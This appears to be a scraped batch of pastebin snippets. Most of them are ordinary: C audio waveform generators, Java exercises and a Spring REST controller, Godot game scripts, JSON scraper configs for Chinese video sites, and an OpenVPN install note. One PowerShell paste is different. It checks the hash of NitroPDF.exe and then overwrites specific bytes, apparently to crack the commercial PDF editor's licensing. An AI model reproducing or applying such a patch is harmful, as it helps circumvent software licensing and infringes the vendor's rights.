			out[i] = 128;  // 128 represents silence for unsigned 8-bit audio
		}
	}
	
	// Copy the audio data to the output buffer
	for (size_t i = 0; i < numFrames; i++) {
		out[i] = audioData->data[audioData->position++];
	}
	
	return paContinue;
}


//wave function pointers
//(uint8_t num)
typedef uint8_t (*ukael8)(uint8_t num);
//(uint16_t num)
typedef uint8_t (*ukael16)(uint16_t num);
//(uint8_t num, uint8_t arg1)
typedef uint8_t (*ukaelArgs2)(uint8_t num, uint8_t arg1);

//testing
typedef uint8_t (*ukaelArgs3)(uint16_t num, uint8_t arg1, uint8_t arg2);

//wave pointers wrapper
typedef uint8_t (*ukaelN)(uint32_t num, uint8_t arg1, uint8_t arg2);

// WaveMap (const char* id, func8, func16, args2)
typedef struct {
	const char* id;
	ukael8 func8;
	ukael16 func16;
	ukaelArgs2 args2;
	ukaelArgs3 args3;
} WaveMap;


// WaveMap waveList. List of various function pointers
const WaveMap waveList[] = {
	//(uint8)
	{""sine"", 		ukaelSine					},
	{""csine"", 		ukaelCSine					},
	{""triangle"", 	ukaelTriangle				},
	{""saw"", 		ukaelSaw					},
	{""square"", 		ukaelSquare					},
	{""testing"", 	testing						},

	//(uint16)
	{""noise"", 		NULL, ukaelNoise			},
	{""wnoise"", 		NULL, ukaelWNoise			},

	//(uint8, uint8)
	{""pulse"", 		NULL, NULL, ukaelPulse		},

	//uint16, uint8, uint8
	{""rwalk"", 	NULL, NULL, NULL, ukaelRWalk	}
};


// Number of elements in the mapping table
const size_t waveCount = sizeof(waveList) / sizeof(waveList[0]);

// generate and store waveform to buffer
void generateTone(
	uint8_t* buffer,
	Frac freq,
	uint32_t length,
	uint8_t amplitude,
	const char* waveKey,
	uint8_t arg0,
	uint8_t arg1
) {
	ukaelN waveFunc = NULL;

	// Find the waveform function pointers based on the string identifier
	for (size_t i = 0; i < waveCount; ++i) {
		if (strcmp(waveKey, waveList[i].id) == 0) {

			ukael8 wf8 = waveList[i].func8;
			ukael16 wf16 = waveList[i].func16;
			ukaelArgs2 args2 = waveList[i].args2;
			ukaelArgs3 args3 = waveList[i].args3;

			if (wf8 != NULL) {
				waveFunc = (ukaelN)wf8;
				break;
			}
			if(wf16 != NULL) {
				waveFunc = (ukaelN)wf16;
				break;
			}
			if(args2 != NULL) {
				waveFunc = (ukaelN)args2;
				break;
			}
			if(args3 != NULL) {
				waveFunc = (ukaelN)args3;
				break;
			}

		}
	}

	if(waveFunc==NULL){
		printf(""Invalid key!\n"");
		return;
	}

	//Generate
	uint8_t value;
	for (uint32_t i = 0; i < length; ++i) {
		value = waveFunc(i * freq.a / freq.b,arg0,buffer[i-(i!=0)]); //i mul by Frac and generate
		value = value * amplitude / UINT8_MAX + (UINT8_MAX - amplitude) / 2; // amplitude
		buffer[i] = (uint8_t)value; // store to buffer
	}

	return;
}"
H7bxbU3r,OutputDrinksTree,CR7CR7,Java,Friday 7th of July 2023 04:53:54 AM CDT,"Drinks
  Hot
    Tea
      Green Tea
      Black Tea
    Coffee
      Americano
      Latte
      Cappuccino
  Cold
    Non-Alcoholic
      Cola
      Fanta
      Soda
    Alcoholic
      Wine
      Beer
      Whisky
"
xNXGbZV4,DrinksTreeDsa,CR7CR7,Java,Friday 7th of July 2023 04:52:30 AM CDT,"import java.util.ArrayList;
import java.util.List;

class Drink {
    private String name;
    private List<Drink> children;

    public Drink(String name) {
        this.name = name;
        this.children = new ArrayList<>();
    }

    public void addChild(Drink drink) {
        children.add(drink);
    }

    public String getName() {
        return name;
    }

    public List<Drink> getChildren() {
        return children;
    }
}

public class DrinkHierarchy {
    public static void main(String[] args) {
        // Create the drink hierarchy
        Drink root = new Drink(""Drinks"");

        Drink hot = new Drink(""Hot"");
        Drink cold = new Drink(""Cold"");
        root.addChild(hot);
        root.addChild(cold);

        Drink tea = new Drink(""Tea"");
        Drink coffee = new Drink(""Coffee"");
        hot.addChild(tea);
        hot.addChild(coffee);

        Drink greenTea = new Drink(""Green Tea"");
        Drink blackTea = new Drink(""Black Tea"");
        tea.addChild(greenTea);
        tea.addChild(blackTea);

        Drink americano = new Drink(""Americano"");
        Drink latte = new Drink(""Latte"");
        Drink cappuccino = new Drink(""Cappuccino"");
        coffee.addChild(americano);
        coffee.addChild(latte);
        coffee.addChild(cappuccino);

        Drink nonAlcoholic = new Drink(""Non-Alcoholic"");
        Drink alcoholic = new Drink(""Alcoholic"");
        cold.addChild(nonAlcoholic);
        cold.addChild(alcoholic);

        Drink cola = new Drink(""Cola"");
        Drink fanta = new Drink(""Fanta"");
        Drink soda = new Drink(""Soda"");
        nonAlcoholic.addChild(cola);
        nonAlcoholic.addChild(fanta);
        nonAlcoholic.addChild(soda);

        Drink wine = new Drink(""Wine"");
        Drink beer = new Drink(""Beer"");
        Drink whisky = new Drink(""Whisky"");
        alcoholic.addChild(wine);
        alcoholic.addChild(beer);
        alcoholic.addChild(whisky);

        // Print the drink hierarchy using pre-order traversal
        printDrinkHierarchy(root, 0);
    }

    public static void printDrinkHierarchy(Drink drink, int level) {
        StringBuilder indent = new StringBuilder();
        for (int i = 0; i < level; i++) {
            indent.append(""  "");
        }

        System.out.println(indent + drink.getName());

        for (Drink child : drink.getChildren()) {
            printDrinkHierarchy(child, level + 1);
        }
    }
}
"
Yh3yggcq,ukaelWaceC.h,Kaelygon,C,Friday 7th of July 2023 04:51:19 AM CDT,"//waveform functions
#include <stdint.h>

unsigned long long rdtsc(){
	unsigned int lo,hi;
	__asm__ __volatile__ (""rdtsc"" : ""=a"" (lo), ""=d"" (hi));
	return ((unsigned long long)hi << 32) | lo;
}

uint8_t rdrand(){
		uint32_t num;
		asm volatile(""rdrand %0""  : ""=r"" (num));
    return num;
}

//refresh random seed
unsigned int ENTROPY=2599267487;
void reseed(){
	ENTROPY^=ENTROPY<<9;
	if((ENTROPY&255)==0){
		unsigned int buf;
		__asm__ __volatile__ (""rdtsc"" : ""=a"" (buf));
		ENTROPY<<=17;
		ENTROPY^=buf;
		return;
	}
	ENTROPY^=ENTROPY>>7;
	return;
}


//sine approximation.
uint8_t ukaelSine(uint8_t num) {						//n=floor(n)
	uint8_t secondHalf = (num >> 7);					//s=floor(n%255/128)
	num <<= 1;											//2*n%255
	uint16_t buf = ((uint16_t)(num)<<1) - UINT8_MAX;	//(2*n-255)%65536
	num = (uint8_t)((buf * buf) >> 9);					//(floor(n^2%65536)/512)%255
	num = secondHalf ? num : ~num;						//n = s ? n : 255-n
	return num;
}

//Crunchy Sine
uint8_t ukaelCSine(uint8_t num) {
	uint8_t secondHalf = (num >> 7);
	uint8_t evenQuarter = (num >> 6)==0 || (num >> 6)==2;
	num = evenQuarter ? ~num : num;	//invert even quarters
	num <<= 2;	//2 period saw
	num >>= 16;	//square root. Crunchy precision
	num*=num;	//square
	num >>= 1;	//divide by 2
	num = secondHalf ? num : ~num;	//invert 2nd half
	return num;
}

//triangle
uint8_t ukaelTriangle(uint8_t num) {
	num+=63;
	uint8_t secondHalf = (num >> 7);
	num <<= 1;
	num = secondHalf ? ~num : num;	//invert 2nd half
	return num;
}

//Saw
uint8_t ukaelSaw(uint8_t num){
	num+=127;	//add UINT_MAX/2
	return num;
}

//Square
uint8_t ukaelSquare(uint8_t num){
	num = ( num>>7 ) ? UINT8_MAX : 0; //hi if 0 to 0.5, low if 0.5 to 1.0
	return num ;
}

//Pulse square 2 arguments
uint8_t ukaelPulse(uint8_t num, uint8_t dutyCycle) {
	num = (num >= dutyCycle) ? UINT8_MAX : 0;	//same as square but dutyCycle sets treshold
	return num ;
}


//Time dependent noise
uint8_t ukaelNoise(uint16_t num) {
	num=num*(ENTROPY<<9);
	if(((num&31)==0)){
		reseed();
	}
	num^=ENTROPY>>7;
    return num;
}

//White noise
uint8_t ukaelWNoise(uint16_t num) {
	reseed();
	num*=3083*ENTROPY;
	return num;
}

//random walk
uint8_t ukaelRWalk(uint16_t num, uint8_t arg1, uint8_t arg2) {
	
	uint8_t random = ukaelNoise(num)>>(arg1&6); //(0 to 255) / 3
	uint8_t sign = random&1; //add=0 subtract=1
	random>>=1;
	random=arg2+(1-sign)*random-(sign)*random; //add or subtract random/2 and reuse random as result
	if(sign==1 && random>arg2){ //underflow 
		return 0;
	}
	if(sign==0 && random<arg2){ //overflow
		return 255;
	}
    return random;
}


uint8_t testing(uint16_t num){
	num*=num*.5;
	num*=(ukaelCSine(num)*ukaelCSine(num))<<4;
    return num;
}




/*
//pointy triangle
uint8_t ukaelTesting(uint8_t num, uint8_t arg1, uint8_t arg2) {
	uint8_t secondHalf = (num >> 7);
	uint8_t evenQuarter = (num >> 6)==0 || (num >> 6)==2;
	num = evenQuarter ? ~num : num;	//invert even quarters

	num<<=2;
	float buf = num;
	buf = buf/(buf+UINT8_MAX)*UINT8_MAX;
	num = buf;
	
	num = secondHalf ? num : ~num;	//invert 2nd half
	return num;
}
*/"
4BCMi7D1,UserRestController,nikolstoyneva,Java,Friday 7th of July 2023 04:47:55 AM CDT,"@RestController
@RequestMapping(""/api/users"")
public class UserRestController {
    private final UserService userService;
    private final AuthenticationHelper authenticationHelper;
    private final UserMapper userMapper;
    private final PostMapper postMapper;
    private final CommentMapper commentMapper;

    @Autowired
    public UserRestController(UserService userService, AuthenticationHelper authenticationHelper, UserMapper userMapper, PostMapper postMapper, CommentMapper commentMapper) {
        this.userService = userService;
        this.postMapper = postMapper;
        this.commentMapper = commentMapper;
        this.authenticationHelper = authenticationHelper;
        this.userMapper = userMapper;
    }

    @GetMapping
    public List<UserDtoOut> getAll(@RequestHeader HttpHeaders headers,
                                   @RequestParam(required = false) String firstName,
                                   @RequestParam(required = false) String username,
                                   @RequestParam(required = false) String sortBy,
                                   @RequestParam(required = false) String sortOrder) {
        try {
            authenticationHelper.tryGetUser(headers);
            return userService.getAll(firstName, username, sortBy, sortOrder)
                    .stream()
                    .map(userMapper::toDto)
                    .collect(Collectors.toList());
        } catch (AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @GetMapping(""/admins"")
    public List<UserDtoOut> getAdmins(@RequestHeader HttpHeaders headers) {
        try {
            authenticationHelper.tryGetUser(headers);
            return userService.getAdmins().stream()
                    .map((userMapper::toDto))
                    .collect(Collectors.toList());
        }  catch (AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }

    }

    @GetMapping(""/id/{id}"")
    public UserDtoOut getById(@RequestHeader HttpHeaders headers, @PathVariable int id) {
        try {
            authenticationHelper.tryGetUser(headers);
            return userMapper.toDto(userService.getById(id));
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        }  catch (AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }

    }

    @GetMapping(""/username/{username}"")
    public UserDtoOut getByUsername(@RequestHeader HttpHeaders headers, @PathVariable String username) {
        try {
            authenticationHelper.tryGetUser(headers);
            return userMapper.toDto(userService.getByUsername(username));
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        }  catch (AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @GetMapping(""/{id}/comments"")
    public List<CommentDtoOut> getUserComments(@RequestHeader HttpHeaders headers, @PathVariable int id) {
        try {
            authenticationHelper.tryGetUser(headers);
            List<Comment> comments = userService.getById(id).getComments().stream().toList();

            if (comments.size() == 0) {
                throw new ResponseStatusException(HttpStatus.NOT_FOUND, ""Comments not found."");
            }

            return comments.stream().map(commentMapper::toDto).collect(Collectors.toList());
        } catch (AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        }
    }

    @GetMapping(""/{id}/posts"")
    public List<PostDtoOut> getUserPosts(@RequestHeader HttpHeaders headers, @PathVariable int id) {
        try {
            authenticationHelper.tryGetUser(headers);
            List<Post> posts = userService.getById(id).getPosts().stream().toList();

            if (posts.size() == 0) {
                throw new ResponseStatusException(HttpStatus.NOT_FOUND, ""Posts not found."");
            }

            return posts.stream().map(postMapper::objectToDto).collect(Collectors.toList());
        } catch (AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        }
    }

    @PostMapping
    public UserDtoOut create(@Valid @RequestBody UserDtoIn userDtoIn) {
        try {
            User user = userMapper.fromDto(userDtoIn);
            userService.create(user);
            return userMapper.toDto(user);
        } catch (DuplicateEntityException e) {
            throw new ResponseStatusException(HttpStatus.CONFLICT, e.getMessage());
        }
    }

    @PutMapping(""/update"")
    public UserDtoOut update(@RequestHeader HttpHeaders headers, @Valid @RequestBody UserDtoIn userDtoCreate) {
        try {
            User loggedUser = authenticationHelper.tryGetUser(headers);
            User update = userMapper.fromDto(loggedUser.getId(), userDtoCreate);
            userService.update(loggedUser, update);
            return userMapper.toDto(update);
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (DuplicateEntityException e) {
            throw new ResponseStatusException(HttpStatus.CONFLICT, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @PutMapping(""/admin/{id}"")
    public UserDtoOut makeAdmin(@RequestHeader HttpHeaders headers, @PathVariable int id,  @RequestBody(required = false) String phoneNumber) {
        try {
            User loggedUser = authenticationHelper.tryGetUser(headers);
            userService.makeAdmin(id, loggedUser, phoneNumber);
            return userMapper.toDto(userService.getById(id));
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @PutMapping(""/admin/{id}/reject"")
    public UserDtoOut makeRegularUser(@RequestHeader HttpHeaders headers, @PathVariable int id) {
        try {
            User loggedUser = authenticationHelper.tryGetUser(headers);
            userService.makeRegularUser(id, loggedUser);
            return userMapper.toDto(userService.getById(id));
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @PostMapping(""/phone-number"")
    public void createPhoneNumber(@RequestHeader HttpHeaders headers, @RequestBody String phoneNumber) {
        try {
            User loggedUser = authenticationHelper.tryGetUser(headers);
            userService.createPhoneNumber(loggedUser, phoneNumber);
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @PutMapping(""/phone-number"")
    public void updatePhoneNumber(@RequestHeader HttpHeaders headers, @RequestBody String phoneNumber) {
        try {
            User loggedUser = authenticationHelper.tryGetUser(headers);

            userService.updatePhoneNumber(loggedUser, phoneNumber);
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @DeleteMapping(""/phone-number"")
    public void deletePhoneNumber(@RequestHeader HttpHeaders headers, @RequestBody String phoneNumber) {
        try {
            User loggedUser = authenticationHelper.tryGetUser(headers);

            userService.deletePhoneNumber(loggedUser, phoneNumber);
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @DeleteMapping(""/{id}"")
    public void delete(@RequestHeader HttpHeaders headers, @PathVariable int id) {
        try {
            User user = authenticationHelper.tryGetUser(headers);
            userService.delete(id, user);
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }
}
"
cJ0kB3Rf,NPDFPEnt145011x86Fix,cigcag,PowerShell,Friday 7th of July 2023 03:54:48 AM CDT,"<#----------------------------------------------------------------------------------------------
Company : Nitro Software, Inc.
Product : Nitro PDF Pro
Edition : Enterprise
Language: English
Version : 14.5.0.11
File    : NitroPDF.exe
Arch    : 32-bit
FileVer : 14.5.0.11
CRC32   : BB754EC3
MD5     : 21F8E71A3C61E31229A8CC8B3D99C854
SHA-1   : E37263F0BE6ED47662B4C704FBB0FA435285C51F
SHA256  : 5A39B741A71D7534D87B087B8564F730565026BB2175593814324B3AAD6FED5B
Download: https://downloads.gonitro.com/professional_14.5.0.11/en/enterprise/nitro_pro14_x86.msi
----------------------------------------------------------------------------------------------#>
$hashSrc = ('5A39B741A71D7534D87B087B8564F730565026BB2175593814324B3AAD6FED5B')
$hashCmp = Get-FileHash 'NitroPDF.exe' -Algorithm SHA256
If ($hashSrc -ne $hashCmp.Hash)
    {
      CLS
      Write-Output 'Checksum of NitroPDF.exe is wrong';
      Read-Host 'Press Enter to exit script...'; break
    } else  {
        Copy-Item -Path 'NitroPDF.exe' -Destination 'NitroPDF.exe.bak';
        $bytes = [System.IO.File]::ReadAllBytes((get-location).path+'\NitroPDF.exe')
        $bytes[0x1C14EB] = 0x01
        $bytes[0x1C14F9] = 0xFF
        $bytes[0x1C14FA] = 0xC0
        $bytes[0x1C14FB] = 0xC3
        $bytes[0x1C16E0] = 0xB0
        $bytes[0x1C16E1] = 0x01
        $bytes = [System.IO.File]::WriteAllBytes((get-location).path+'\NitroPDF.exe',$bytes)
        CLS
        Write-Output 'NitroPDF.exe is successfully patched';
        Read-Host 'Press Enter to exit script...'; break
            }
"
TtYY83tB,huanyuxing,Damonwei,JSON,Friday 7th of July 2023 03:54:04 AM CDT,"{
""author"":""Dwei-0706"",
""ua"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36"",
""homeUrl"": ""https://www.huanyuxing.com/"",
""cateManual"": {""电视剧"": ""id-b"",""电影"": ""id-a"",""动漫"": ""id-c"",""综艺"": ""id-d""},
""homeVodNode"": ""//div[@class='packcover']/a"",
""homeVodName"": ""/@title"",
""homeVodId"": ""/@href"",
""homeVodIdR"": """",
""homeVodImg"": ""/div/@data-original"",
""homeVodImgR"": """",
""homeVodMark"": ""/span/text()"",
""cateUrl"": ""https://www.huanyuxing.com/s/{cateId}/page/{catePg}.html"",
""cateVodNode"": ""//div[@class='packcover']/a"",
""cateVodName"": ""/@title"",
""cateVodId"": ""/@href"",
""cateVodIdR"": """",
""cateVodImg"": ""/div/@data-original"",
""cateVodImgR"": """",
""cateVodMark"": ""/span/text()"",
""dtUrl"":""https://www.huanyuxing.com{vid}"",
""dtNode"": ""//body"",
""dtName"": ""//h1/text()"",
""dtNameR"": """",
""dtImg"": ""//div[@class='detailpic l']/img/@src"",
""dtImgR"": ""\\S+(http\\S+)"",
""dtCate"": ""concat(//div[@class='detailinfo r']/p[2]/a/text())"",
""dtCateR"": """",
""dtYear"": ""//div[@class='detailinfo r']/p[3]/a/text()"",
""dtYearR"": """",
""dtArea"": ""//div[@class='detailinfo r']/p[7]/text()"",
""dtAreaR"": """",
""dtMark"": """",
""dtMarkR"": """",
""dtDirector"": ""concat(//div[@class='detailinfo r']/p[4]/a/text())"",
""dtDirectorR"": """",
""dtActor"": ""concat(//div[@class='detailinfo r']/p[5]/a/text())"",
""dtActorR"": """",
""dtDesc"": ""concat('Dwei观影提示：资源播放失败可切换不同线路或点击快速搜索其他站点观看，若线路存在广告请勿相信！！简介：',//div[@class='uibox']/div/text())"",
""dtFromNode"": ""//ul[contains(@id,'down')]/li"",
""dtFromName"":  ""concat('迅雷资源')"",
""dtFromNameR"": """",
""dtUrlNode"": ""//div[contains(@id,'downlist')]"",
""dtUrlSubNode"": ""/div/p"",
""dtUrlId"": ""/a/@href"",
""dtUrlIdR"": """",
""dtUrlName"": ""/text()"",
""dtUrlNameR"": """",
""playUrl"":"""",
""searchUrl"":""https://www.huanyuxing.com/c.html?wd={wd}"",
""scVodNode"":""//div[@class='search']"",
""scVodName"":""/h3/a/@title"",
""scVodId"":""/h3/a/@href"",
""scVodImg"":""/div//img/@src"",
""scVodImgR"":"""",
""scVodMark"":""/div/div[2]/div[1]/span[2]/text()""
}"
CVhzsdJX,openvpn,kyoryo,Bash,Friday 7th of July 2023 03:44:32 AM CDT,"# Open VPN installer
# check https://github.com/angristan/openvpn-install

curl -O https://raw.githubusercontent.com/angristan/openvpn-install/master/openvpn-install.sh
chmod +x openvpn-install.sh

# add new user through this
sudo su
./openvpn-install.sh
# use password
# this will generate <client_name>.ovpn
# copy this to client
"
hmW127H3,longest shortest word ez1,shivamisone,Java,Friday 7th of July 2023 02:46:32 AM CDT,"import java.util.*;
public class breh{
    public static void main(){
        Scanner sc= new Scanner(System.in);
        String k = sc.nextLine();
        k = k+"" "";
        int j =0;
        String[] ar = new String[k.length()];
        int[] ar1 = new int[k.length()];
        String word = """";
        for(int i =0;i<k.length();i++){
            word =word+k.charAt(i);
            if(k.charAt(i) == ' '){
                ar[j] = word;
                ar1[j] = word.length();
                word = """";
                j++;
            }
        }
        String[] ar2 = ar.clone();
        System.out.println(""longest:""+Arrays.toString(ar));
        System.out.println(""longest:""+Arrays.toString(ar1));
        for(int b =0;b<ar.length;b++){
            for(int i =0; i<k.length()-1;i++){
                if(ar1[i+1]>ar1[i]){
                    int t = ar1[i];
                    ar1[i] = ar1[i+1];
                    ar1[i+1] = t;
                    String tt = ar[i];
                    ar[i] = ar[i+1];
                    ar[i+1] = tt;
                }
            }
        }
        System.out.println(""smallest:""+ar[j-1]);
        System.out.println(""longest:""+ar[0]);
        for(int i =0; i<=j;i++){
            if(ar2[i] == ar[0]){
                for(int l = ar[0].length()-1;l>=0;l--){
                    System.out.print(ar[0].charAt(l));
                }
                System.out.print("" "");
                continue;
            }
            else if(ar2[i] == ar[j-1]){
                for(int l = ar[j-1].length()-1;l>=0;l--){
                    System.out.print(ar[0].charAt(l));
                }
                System.out.print("" "");
                continue;
            }
            System.out.print(ar2[i]);
        }
    }
}"
iqQdp253,xi1,Damonwei,JSON,Friday 7th of July 2023 02:40:33 AM CDT,"{
""author"":""Dwei-0706"",
""ua"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36"",
""homeUrl"": ""https://xi1.tv/"",
""cateManual"": {""电视剧"": ""TVshowX"",""电影"": ""FilmX"",""动漫"": ""AnimeX"",""综艺"": ""VarietyX"",""赛事"": ""tiyuX""},
""homeVodNode"": ""//ul[contains(@class,'hl-vod-list hl-wide-list')]/li/a"",
""homeVodName"": ""/@title"",
""homeVodId"": ""/@href"",
""homeVodIdR"": """",
""homeVodImg"": ""/@data-original"",
""homeVodImgR"": """",
""homeVodMark"": ""/div[3]/span/text()"",
""cateUrl"": ""https://xi1.tv/tvshow/{cateId}XXXXXXX{catePg}XXX.html"",
""cateVodNode"": ""//ul[contains(@class,'hl-vod-list hl-wide-list')]/li/a"",
""cateVodName"": ""/@title"",
""cateVodId"": ""/@href"",
""cateVodIdR"": """",
""cateVodImg"": ""/@data-original"",
""cateVodImgR"": """",
""cateVodMark"": ""/div[3]/span/text()"",
""dtUrl"":""https://xi1.tv{vid}"",
""dtNode"": ""//div[@id='conch-content']"",
""dtName"": ""//h1/text()"",
""dtNameR"": """",
""dtImg"": ""//div[@class='hl-dc-pic']/span/@data-original"",
""dtImgR"": ""\\S+(http\\S+)"",
""dtCate"": ""concat(//div[@class='hl-data-xs hl-text-muted']/a//text())"",
""dtCateR"": """",
""dtYear"": """",
""dtYearR"": """",
""dtArea"": """",
""dtAreaR"": """",
""dtMark"": """",
""dtMarkR"": """",
""dtDirector"": ""concat(//li[@class='hl-col-xs-12'][3]/a/text())"",
""dtDirectorR"": """",
""dtActor"": ""concat(//li[@class='hl-col-xs-12'][2]/a/text())"",
""dtActorR"": """",
""dtDesc"": ""concat('Dwei观影提示：资源播放失败可切换不同线路或点击快速搜索其他站点观看，若线路存在广告请勿相信！！简介：',//li[@class='hl-col-xs-12 blurb']/text())"",
""dtFromNode"": ""//div[contains(@class,'hl-plays-from')]/a"",
""dtFromName"":  ""/text()"",
""dtFromNameR"": """",
""dtUrlNode"": ""//ul[contains(@id,'hl-plays-list')]"",
""dtUrlSubNode"": ""/li/a"",
""dtUrlId"": ""/@href"",
""dtUrlIdR"": """",
""dtUrlName"": ""/text()"",
""dtUrlNameR"": """",
""playUrl"":""https://xi1.tv{playUrl}"",
""searchUrl"":""https://xi1.tv/tvsearch/XXXXXXXXXXXXX.html?wd={wd}&submit="",
""scVodNode"":""//div[contains(@class,'hl-item-pic')]/a"",
""scVodName"":""/@title"",
""scVodId"":""/@href"",
""scVodImg"":""/@data-original"",
""scVodImgR"":"""",
""scVodMark"":""/div[3]/span/text()""
}"
QX4tktiq,Dodge the Creeps,Junaid_Hossain,GDScript,Friday 7th of July 2023 02:37:00 AM CDT,"#main.gd

extends Node

@export var alien_scene: PackedScene
var score = 0

func _ready():
	randomize()
	
func new_game():
	score = 0
	$StartTimer.start()
	await $StartTimer.timeout
	$ScoreTimer.start()
	$AlienTimer.start()
	
func game_over():
	$ScoreTimer.stop()

func _on_alien_timer_timeout():
	var alien_spawn_location = $AlienPath/AlienSpawnLocation
	alien_spawn_location.progress_ratio = randf()

	var alien = alien_scene.instance()
	add_child(alien)

	alien.position = alien_spawn_location.position

	var direction = alien_spawn_location.rotation + PI / 2
	direction += randf_range(-PI / 4, PI / 4)
	alien.rotation = direction

	var velocity = Vector2(randf_range(alien.min_speed, alien.max_speed), 0)
	alien.linear_velocity = velocity.rotated(direction)
	print(alien_spawn_location)
	print(velocity)



func _on_score_timer_timeout():
	score += 1
	$HUD.update_score(score)


#alien.gd
extends RigidBody2D

@export var min_speed = 150.0
@export var max_speed = 250.0

func _ready():
	$AnimatedSprite2D.play()
	var alien_types = $AnimatedSprite2D.sprite_frames.get_animation_names()
	$AnimatedSprite2D.animation = alien_types[randi() % alien_types.size()]


func _on_visible_on_screen_notifier_2d_screen_exited():
	queue_free()


#HUD.gd
extends CanvasLayer

signal start_game

func update_score(score):
	$ScoreLabel.text = str(score)
	
func show_message(text):
	$MessageLabel.text = text
	$MessageLabel.show()
	$MessageTimer.start()
	
func show_game_over():
	show_message(""Game Over"")

func _on_button_pressed():
	$Button.hide()
	emit_signal(""start_game"")


func _on_message_timer_timeout():
	$MessageLabel.hide()




#player.gd
extends Area2D

signal hit

@export var speed = 400.0
var screen_size = Vector2.ZERO

func _ready():
	screen_size = get_viewport_rect().size
	#print(screen_size)

func _process(delta):
	var direction = Vector2.ZERO
	if Input.is_action_pressed(""move_right""):
		direction.x += 1
	if Input.is_action_pressed(""move_left""):
		direction.x -= 1
	if Input.is_action_pressed(""move_up""):
		direction.y -= 1
	if Input.is_action_pressed(""move_down""):
		direction.y += 1
	
	if direction.length() > 0:
		direction = direction.normalized()
		$AnimatedSprite2D.play()
	else:
		$AnimatedSprite2D.stop()
		
	position += direction * speed * delta
	position.x = clamp(position.x, 0, screen_size.x)
	position.y = clamp(position.y, 0, screen_size.y)
	
	if direction.x != 0:
		$AnimatedSprite2D.animation = ""right""
		$AnimatedSprite2D.flip_h = direction.x < 0
		$AnimatedSprite2D.flip_v = false
	elif direction.y != 0:
		$AnimatedSprite2D.animation = ""up""
		$AnimatedSprite2D.flip_v = direction.y > 0

func start(new_position):
	position = new_position
	show()
	$CollisionShape2D.disabled = false

func _on_body_entered(body):
	hide()
	$CollisionShape2D.set_deferred(""disabled"", true)
	emit_signal(""hit"")

"
dAEUDHhn,ازاي تكتب بسرعة على الكمبيوتر,ghostman905,JavaScript,Friday 7th of July 2023 02:29:33 AM CDT,"ابدأ من صف الارتكاز واوصل منه لباقى الحروف . المس الحروف ك م ن ت ب ي س ش بـ 8 أصابع والمسطرة بالإبهام . 

https://worrdpro.blogspot.com/2022/04/Download-rapid-typing-to-learn-touch-typing.html"
2eyZ87aS,Untitled,lodha1503,JavaScript,Friday 7th of July 2023 02:16:39 AM CDT,"import React from 'react'

const OneWaySlab = (props) => {
    const Long_Span=props.length;
    const Short_Span=props.breadth;
    const Live_Load=10;
    const Dead_Load=10;
    
    const Floor_Finish=1;

    

    const D=Short_Span/28;
    const Effective_depth=Math.round(D*1000);

    const Total_depth = Effective_depth + 20;

    const width = 10; // Given

    const shorter_effectivespan1 = (Short_Span*1000) + width;
    const longer_effectivespan1 = (Long_Span*1000) + width;
    const shorter_effectivespan2 = Effective_depth + (Short_Span*1000);
    const longer_effectivespan2 = Effective_depth + (Long_Span*1000);

    const Self_weight = 25*(1)*(Total_depth/1000)  ;

    const Total_Load = Live_Load + Dead_Load + Self_weight + Floor_Finish;

    const Factored_Load = 1.5*Total_Load ;
    const Factored_Moment = (Factored_Load*(shorter_effectivespan/1000)**2)/8;
    const Factored_shearforce = (Factored_Load*(shorter_effectivespan/1000))/2;

    const Concrete_grade = 20;
    const Steel_Strength = 415;

